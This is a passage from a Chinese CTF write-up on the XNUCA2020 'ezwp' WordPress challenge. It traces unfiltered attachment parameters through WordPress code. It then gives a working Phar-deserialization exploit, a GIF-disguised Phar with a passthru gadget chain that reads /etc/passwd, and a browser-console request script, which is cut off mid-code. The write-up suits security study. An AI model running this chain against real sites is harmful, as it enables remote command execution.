class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Array of post data. Defaults to the contents of $_POST.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|WP_Error Array of post data on success, WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_get_allowed_postdata</span>(<span class="params"> $post_data = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="keyword">empty</span>( $post_data ) ) &#123;</span><br><span class="line">		$post_data = $_POST;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Pass through errors.</span></span><br><span class="line">	<span class="keyword">if</span> ( is_wp_error( $post_data ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> $post_data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> array_diff_key( $post_data, array_flip( <span class="keyword">array</span>( <span class="string">&#x27;meta_input&#x27;</span>, <span class="string">&#x27;guid&#x27;</span> ) ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>直接过滤了meta_input与guid参数，另外需要说明的是在官方的补丁中还包含了file参数，但是在该题目中却并没有（上面的源码是题目中的）这就导致了可以利用file参数控制_wp_attachment_metadata与_wp_attached_file字段。</p>
<h1 id="0x3-wp-attached-file"><a href="#0x3-wp-attached-file" class="headerlink" title="0x3 wp_attached_file"></a>0x3 wp_attached_file</h1><p>首先需要修改_wp_attached_file字段。在/wp-admin/post.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">switch</span> ( $action ) &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">		check_admin_referer( <span class="string">&#x27;update-post_&#x27;</span> . $post_id );</span><br><span class="line"></span><br><span class="line">		$post_id = edit_post();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Session cookie flag that the post was saved.</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">isset</span>( $_COOKIE[<span class="string">&#x27;wp-saving-post&#x27;</span>] ) &amp;&amp; $_COOKIE[<span class="string">&#x27;wp-saving-post&#x27;</span>] === $post_id . <span class="string">&#x27;-check&#x27;</span> ) &#123;</span><br><span class="line">			setcookie( <span class="string">&#x27;wp-saving-post&#x27;</span>, $post_id . <span class="string">&#x27;-saved&#x27;</span>, time() + DAY_IN_SECONDS, ADMIN_COOKIE_PATH, COOKIE_DOMAIN, is_ssl() );</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		redirect_post( $post_id ); <span class="comment">// Send user on their way while we keep working.</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>流程转入edit_post函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update an existing post with values provided in $_POST.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is passed as an argument, it is treated as an array of data</span></span><br><span class="line"><span class="comment"> * keyed appropriately for turning into a post object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is not passed, the $_POST global variable is used instead.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> wpdb $wpdb WordPress database abstraction object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Optional. Defaults to the $_POST global.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int Post ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_post</span>(<span class="params"> $post_data = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">	$post_data = _wp_translate_postdata( <span class="literal">true</span>, $post_data );</span><br><span class="line">	<span class="keyword">if</span> ( is_wp_error( $post_data ) ) &#123;</span><br><span class="line">		wp_die( $post_data-&gt;get_error_message() );</span><br><span class="line">	&#125;</span><br><span class="line">	$translated = _wp_get_allowed_postdata( $post_data );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Attachment stuff.</span></span><br><span class="line">	<span class="keyword">if</span> ( <span class="string">&#x27;attachment&#x27;</span> === $post_data[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">isset</span>( $post_data[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] ) ) &#123;</span><br><span class="line">			$image_alt = wp_unslash( $post_data[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] );</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> ( get_post_meta( $post_ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> ) !== $image_alt ) &#123;</span><br><span class="line">				$image_alt = wp_strip_all_tags( $image_alt, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">				<span class="comment">// update_post_meta() expects slashed.</span></span><br><span class="line">				update_post_meta( $post_ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, wp_slash( $image_alt ) );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$attachment_data = <span class="keyword">isset</span>( $post_data[<span class="string">&#x27;attachments&#x27;</span>][ $post_ID ] ) ? $post_data[<span class="string">&#x27;attachments&#x27;</span>][ $post_ID ] : <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/** This filter is documented in wp-admin/includes/media.php */</span></span><br><span class="line">		$translated = apply_filters( <span class="string">&#x27;attachment_fields_to_save&#x27;</span>, $translated, $attachment_data );</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">	$success = wp_update_post( $translated );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>其中translated保存了过滤后的post数据，由于题目中没有过滤file参数，所以这里的translated中依旧存在file参数。再看wp_update_post函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update a post with new post data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The date does not have to be set for drafts. You can set the date and it will</span></span><br><span class="line"><span class="comment"> * not be overridden.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|object $postarr  Optional. Post data. Arrays are expected to be escaped,</span></span><br><span class="line"><span class="comment"> *                               objects are not. Default array.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool         $wp_error Optional. Allow return of WP_Error on failure. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|WP_Error The post ID on success. The value 0 or WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_post</span>(<span class="params"> $postarr = <span class="keyword">array</span>(<span class="params"></span>), $wp_error = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">	<span class="comment">// Merge old and new fields with new fields overwriting old ones.</span></span><br><span class="line">	$postarr                  = array_merge( $post, $postarr );</span><br><span class="line">	$postarr[<span class="string">&#x27;post_category&#x27;</span>] = $post_cats;</span><br><span class="line">	<span class="keyword">if</span> ( $clear_date ) &#123;</span><br><span class="line">		$postarr[<span class="string">&#x27;post_date&#x27;</span>]     = current_time( <span class="string">&#x27;mysql&#x27;</span> );</span><br><span class="line">		$postarr[<span class="string">&#x27;post_date_gmt&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">return</span> wp_insert_post( $postarr, $wp_error );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>流程转入到wp_insert_post。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Insert or update a post.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the $postarr parameter has &#x27;ID&#x27; set to a value, then post will be updated.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can set the post date manually, by setting the values for &#x27;post_date&#x27;</span></span><br><span class="line"><span class="comment"> * and &#x27;post_date_gmt&#x27; keys. You can close the comments or open the comments by</span></span><br><span class="line"><span class="comment"> * setting the value for &#x27;comment_status&#x27; key.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.2.0 Support was added for encoding emoji in the post title, content, and excerpt.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.4.0 A &#x27;meta_input&#x27; array can now be passed to `$postarr` to add post meta data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_insert_post</span>(<span class="params"> $postarr, $wp_error = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> ( <span class="string">&#x27;attachment&#x27;</span> === $postarr[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">&#x27;file&#x27;</span>] ) ) &#123;</span><br><span class="line">			update_attached_file( $post_ID, $postarr[<span class="string">&#x27;file&#x27;</span>] );</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">&#x27;context&#x27;</span>] ) ) &#123;</span><br><span class="line">			add_post_meta( $post_ID, <span class="string">&#x27;_wp_attachment_context&#x27;</span>, $postarr[<span class="string">&#x27;context&#x27;</span>], <span class="literal">true</span> );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>直接传递postarr[‘file’]，再看update_attached_file。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update attachment file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Used to update the file path of the attachment, which uses post meta name</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; to store the path of the attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $file          File path for the attachment.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool True on success, false on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_attached_file</span>(<span class="params"> $attachment_id, $file </span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( ! get_post( $attachment_id ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the path to the attached file to update.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $file          Path to the attached file to update.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	$file = apply_filters( <span class="string">&#x27;update_attached_file&#x27;</span>, $file, $attachment_id );</span><br><span class="line"></span><br><span class="line">	$file = _wp_relative_upload_path( $file );</span><br><span class="line">	<span class="keyword">if</span> ( $file ) &#123;</span><br><span class="line">		<span class="keyword">return</span> update_post_meta( $attachment_id, <span class="string">&#x27;_wp_attached_file&#x27;</span>, $file );</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> delete_post_meta( $attachment_id, <span class="string">&#x27;_wp_attached_file&#x27;</span> );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>直接通过update_post_meta更新_wp_attached_file字段，最终导致file可控。</p>
<h1 id="0x4-wp-attachment-metadata"><a href="#0x4-wp-attachment-metadata" class="headerlink" title="0x4 wp_attachment_metadata"></a>0x4 wp_attachment_metadata</h1><p>接下来修改_wp_attachmen\t_metadata字段，同样在在/wp-admin/post.php中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">switch</span> ( $action ) &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;editattachment&#x27;</span>:</span><br><span class="line">		check_admin_referer( <span class="string">&#x27;update-post_&#x27;</span> . $post_id );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Don&#x27;t let these be changed.</span></span><br><span class="line">		<span class="keyword">unset</span>( $_POST[<span class="string">&#x27;guid&#x27;</span>] );</span><br><span class="line">		$_POST[<span class="string">&#x27;post_type&#x27;</span>] = <span class="string">&#x27;attachment&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the thumbnail filename.</span></span><br><span class="line">		$newmeta          = wp_get_attachment_metadata( $post_id, <span class="literal">true</span> );</span><br><span class="line">		$newmeta[<span class="string">&#x27;thumb&#x27;</span>] = $_POST[<span class="string">&#x27;thumb&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		wp_update_attachment_metadata( $post_id, $newmeta );</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// Intentional fall-through to trigger the edit_post() call.</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>有一个wp_update_attachment_metadata，参数newmeta[‘thumb’]刚好就是我们需要的imagedata[‘thumb’]。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Updates metadata for an attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data          Attachment meta data.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|bool False if $post is invalid.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_attachment_metadata</span>(<span class="params"> $attachment_id, $data </span>) </span>&#123;</span><br><span class="line">	$attachment_id = (<span class="keyword">int</span>) $attachment_id;</span><br><span class="line"></span><br><span class="line">	$post = get_post( $attachment_id );</span><br><span class="line">	<span class="keyword">if</span> ( ! $post ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the updated attachment meta data.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array $data          Array of updated attachment meta data.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	$data = apply_filters( <span class="string">&#x27;wp_update_attachment_metadata&#x27;</span>, $data, $post-&gt;ID );</span><br><span class="line">	<span class="keyword">if</span> ( $data ) &#123;</span><br><span class="line">		<span class="keyword">return</span> update_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, $data );</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> delete_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span> );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>直接通过update_post_meta更新_wp_attachment_metadata字段，导致imagedata可控。</p>
<h1 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h1><p>首先需要生成一个Phar文件，但是WordPress并不傻，Phar这种很容易被反序列化的文件WordPress肯定是不让直接上传的，因此这里就需要先将Phar文件伪装成gif文件之后才可以直接上传，但是序列化后的字符串还存在与该gif文件中，在phar伪协议读取该gif文件的时候仍旧可以触发反序列化。另外WordPress会拦截上传文件中的php代码，如果直接将<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>写入gif文件中会被WordPress拦截，因此可以使用短标签即可绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $callback;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_preserve;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_preserve = <span class="keyword">new</span> Requests_Utility_FilteredIterator(<span class="keyword">array</span>(<span class="string">&#x27;cat /etc/passwd&#x27;</span>), <span class="string">&#x27;passthru&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;a.gif&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;? __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">// Short tag.</span></span><br><span class="line">$phar-&gt;setMetadata(<span class="keyword">new</span> Ai1ec_Shutdown_Controller());</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;a.phar&#x27;</span>, <span class="string">&#x27;a.gif&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>生成好gif以后上传该文件，上传成功以后就可以拿到该文件的id。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/3.png"></p>
<p>WordPress为了防御CSRF，在每一个页面都加入了一个nonce以及对referer的验证，所以我们还需要拿到nonce才能发送post请求。注意每个页面的nonce都不同，这里需要edit页面的nonce，如下所示。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/4.png"></p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/5.png"></p>
<p>为了避免登陆cookie的麻烦，直接使用ajax发送请求，当然使用python也可以，将下面的exp配置修改完成后粘贴到浏览器控制台执行即可，如果下面的exp返回了错误的结果（例如403），那么可能是由于nonce或者id错误。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nonce = <span class="string">&quot;37e43b20f4&quot;</span></span><br><span class="line"><span class="keyword">var</span> id = <span class="string">&quot;9&quot;</span></span><br><span class="line"><span class="keyword">var</span> thumb = <span class="string">&quot;phar://../wp-content/uploads/2020/12/a.gif/test.txt&quot;</span></span><br><span class="line"><span class="keyword">var</span> ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment">// var ip = &quot;172.16.9.51&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// _wp_attached_file</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>:<span class="string">&quot;attachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;Z:\\Z&quot;</span></span><br><span class="line">    &#125;</span><br><span 